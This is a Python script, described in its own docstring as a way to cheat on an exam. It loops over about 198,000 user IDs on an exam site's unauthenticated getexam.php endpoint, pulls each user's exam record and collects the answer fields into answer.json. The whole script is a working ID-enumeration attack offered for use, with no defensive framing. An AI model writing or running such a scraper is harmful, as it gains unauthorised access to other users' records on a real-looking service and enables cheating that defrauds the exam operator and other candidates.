'''
use api to cheat on the exam
'''
import json
from collections import defaultdict

import requests
import tqdm


def initialization():
    all_options = defaultdict(dict)
    response = requests.get(
        f'http://s.ehejun.com/getexam.php?user_id=192371&exam_type=1410').json(
        )
    for question_payload in response['data']['questions']:
        question_payload = question_payload['question']

        question = question_payload['question']
        A = question_payload['A']
        B = question_payload['B']
        C = question_payload['C']
        D = question_payload['D']

        all_options[question][A['option']] = 1
        all_options[question][B['option']] = 1
        all_options[question][C['option']] = 1
        all_options[question][D['option']] = 1
    return all_options


all_options = initialization()
json.dump(all_options, open('tmp.json', 'w'))

not_sured_amount = len(all_options)
for index, user_id in enumerate(tqdm.tqdm(range(199375, 1000, -1))):
    if index % 30 == 0:
        print('dump into answer.json')
        json.dump(all_options, open('answer.json', 'w'))
    try:
        response = requests.get(
            f'http://s.ehejun.com/getexam.php?user_id={user_id}&exam_type=1410'
        )
    except requests.exceptions.ConnectionError as e:
        continue
    if not_sured_amount < 10:
        break

    if response.status_code == 200:
        response = response.json()
        if response['code'] == 200:
            for question_payload in response['data']['questions']:
                question_payload = question_payload['question']
                if 'answer' in question_payload:
                    question = question_payload['question']
                    answer_option = question_payload['answer']

                    for option in ['A', 'B', 'C', 'D']:
                        if question_payload[option][
                                'ori_order'] == answer_option:
                            answer_string = question_payload[option]['option']

                            try:
                                del all_options[question][answer_string]
                            except Exception:
                                pass

                            if len(all_options[question]) == 1:
                                not_sured_amount -= 1